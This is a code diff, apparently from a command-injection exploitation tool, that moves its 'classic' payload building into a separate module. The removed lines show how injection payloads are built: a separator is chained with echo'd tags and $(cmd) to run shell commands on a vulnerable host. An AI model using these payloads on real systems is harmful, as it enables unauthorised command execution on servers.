@@ -31,6 +31,8 @@ from src.utils import settings
 from src.core.requests import headers
 from src.core.requests import parameters
 
+from src.core.injections.results_based.techniques.payloads import classic_payloads
+
 """
   The "classic" technique on Result-based OS Command Injection.
 """
@@ -127,10 +129,9 @@ def classic_exploitation_handler(url,delay,filename,http_request_method):
 	    B64_DEC_TRICK = ""
 	    
 	  try:
-	    payload = (seperator + 
-		      "echo '" + TAG + "'" +
-		      "$(echo '" + B64_ENC_TAG + "'" + B64_DEC_TRICK + ")'" + TAG + "'"
-			) 
+	    
+	    # Classic decision payload (check if host is vulnerable).
+	    payload = classic_payloads.decision(seperator,TAG,B64_ENC_TAG,B64_DEC_TRICK)
 			    
 	    # Check if defined "--prefix" option.
 	    if menu.options.prefix:
@@ -293,12 +294,8 @@ def classic_exploitation_handler(url,delay,filename,http_request_method):
 		    sys.exit(0)
 		    
 		  else:
-		    payload = (seperator + 
-			      "echo '" + TAG + "'" +
-			      "$(echo '"+TAG+"')"+
-			      "$(" + cmd + ")"+
-			      "$(echo '" + TAG + "')'" + TAG +"'"
-			      )
+		    # Execute shell commands on vulnerable host.
+		    payload = classic_payloads.cmd_execution(seperator,TAG,cmd)
 		    
 		    if seperator == " " :
 		      payload = re.sub(" ", "%20", payload)
